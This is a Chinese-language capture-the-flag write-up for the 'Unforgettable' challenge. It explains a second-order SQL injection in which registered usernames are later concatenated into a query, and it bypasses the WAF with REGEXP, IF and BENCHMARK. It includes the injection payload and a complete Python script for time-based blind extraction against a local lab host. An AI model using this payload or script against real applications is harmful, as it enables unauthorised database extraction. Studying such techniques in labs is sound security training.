# Unforgettable

## 题目简述

应用在注册阶段过滤 `username`，但 `/user` 页面又把已保存的用户名拼进 `SELECT * FROM user WHERE username='xx'`。因此注入语句不是在注册请求里立即执行，而是在之后登录并访问 `/user` 时二次进入 SQL 语句。WAF 禁用了 `> < = like 0x ascii hex substr char` 等常用关键字，却保留了 `REGEXP`；结合 `IF` 与 `BENCHMARK` 可以构造基于响应时间的逐字符盲注。

## 解题过程

先确认二次注入的触发链：用恶意 `username` 注册一个账号，随后以未受污染的 `email` 登录，最后访问 `/user`。直到第三步，数据库中的用户名才会被拼接到查询中。直接在注册响应上判断真假不会得到有效 oracle。

`REGEXP '^prefix'` 可以判断目标字符串是否以候选前缀开头，条件成立时执行高开销哈希：

```sql
'&&/**/IF(
  (SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg)
    REGEXP/**/'^hgame\{',
  BENCHMARK(10000000,SHA2('a',256)),
  0
)#
```

这里表名 `ffflllaagggg` 与列名 `ffllllaaaagg` 均来自前两轮枚举。枚举元数据时也使用同一思路，例如查询 `information_schema.tables` 的 `table_name`，再查询 `information_schema.columns` 的 `column_name`。注释 `/**/` 用来替代空格，`#` 截断原查询末尾的单引号。

下面是整理后的完整脚本。每次猜测都创建随机用户名和邮箱，避免唯一键冲突；若 `/user` 的耗时超过 4 秒，就接受当前字符。`$` 是正则表达式的结尾锚点，当它命中时说明目标字符串已经完整恢复，而不是 flag 的实际字符。

```python
import random
import string
import time

import requests


BASE_URL = "http://127.0.0.1:10041/{path}"
USER_URL = BASE_URL.format(path="user")
PASSWORD = "123456"
CHARSET = "1234567890abcdefghijklmnopqrstuvwxyz_{}$"

PAYLOAD = (
    "{prefix}'&&/**/IF("
    "(SELECT/**/ffllllaaaagg/**/FROM/**/ffflllaagggg)"
    "REGEXP/**/'^{guess}',"
    "BENCHMARK(10000000,SHA2('a',256)),0)#"
)


def random_text(length=20):
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def register(username, email):
    requests.post(
        BASE_URL.format(path="register"),
        data={"username": username, "email": email, "password": PASSWORD},
        timeout=15,
    ).raise_for_status()


def login(email):
    session = requests.Session()
    session.post(
        BASE_URL.format(path="login"),
        data={"email": email, "password": PASSWORD},
        timeout=15,
    ).raise_for_status()
    return session


def delayed(prefix, guess):
    clean_prefix = random_text()
    email = f"{random_text()}@example.com"
    username = PAYLOAD.format(prefix=clean_prefix, guess=guess)
    register(username, email)

    session = login(email)
    started = time.perf_counter()
    session.get(USER_URL, allow_redirects=False, timeout=15)
    return time.perf_counter() - started > 4


def extract():
    result = ""
    while True:
        for character in CHARSET:
            candidate = result + character
            time.sleep(0.1)
            if delayed("", candidate):
                if character == "$":
                    return result
                result = candidate
                print(result)
                break
        else:
            raise RuntimeError("当前字符集无法继续匹配")


print(extract())
```

`BENCHMARK` 的绝对阈值受服务器负载和网络延迟影响。实战时应先分别测量真、假条件的耗时，再选择阈值；如果抖动明显，可对同一候选重复测量并取中位数。官方 PDF 没有保存动态环境中的最终 flag，因此这里不虚构结果。

## 方法总结

本题的关键不是绕过一个单独的登录判断，而是识别“写入时过滤、读取时拼接”的二次注入生命周期。常见比较函数被过滤后，`REGEXP '^prefix'` 仍能提供前缀 oracle，`IF + BENCHMARK` 则把真假转换为可观测时间差。复现时要为每次猜测使用独立账号，并把 `$` 当作正则结尾条件，否则会把终止标记误写进结果。
